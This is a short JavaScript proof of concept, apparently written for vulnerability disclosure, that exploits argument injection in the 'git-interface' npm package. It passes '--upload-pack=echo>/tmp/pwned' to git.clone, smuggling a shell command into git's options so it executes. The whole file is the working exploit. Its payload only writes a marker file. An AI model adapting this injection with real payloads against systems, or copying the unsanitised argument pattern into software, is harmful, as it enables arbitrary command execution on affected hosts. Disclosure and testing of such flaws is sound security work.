const { Git } = require('git-interface');

const git = new Git({
    dir: '/tmp/new' //default path is current directory
});

git.clone('file:///tmp/new', '--upload-pack=echo>/tmp/pwned');
